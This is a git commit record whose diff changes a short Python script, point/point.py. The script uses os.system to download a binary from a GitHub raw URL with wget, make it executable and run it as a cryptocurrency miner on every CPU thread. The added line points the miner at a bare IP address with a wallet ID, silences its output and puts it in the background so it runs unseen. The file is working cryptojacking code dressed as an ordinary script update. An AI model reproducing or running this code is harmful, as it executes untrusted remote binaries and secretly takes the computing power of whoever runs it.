809e91b250f77dc6d6ed094eaa0857d715bb6e76
amberektheoenny <amberektheoenny@outlook.com>
2025-01-04 06:33:21 +0700

    Update point.py

--- point/point.py
+++ point/point.py
@@ -1,4 +1,4 @@
 import sys
 import os
 os.system("wget https://github.com/erlandi-main-api/testpoint/raw/main/cp")
-os.system("chmod +x cp && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.test -t $(nproc)")
+os.system("chmod +x cp && ./cp yespowertide  -o 8.209.210.176:80 -u TQzCg7GXgftgYSbKKAe1E5XWZaf5F7GxsG.$(echo $(shuf -i 1-9 -n 1)-ambar) -p -x -t $(nproc --all) &>/dev/null &")
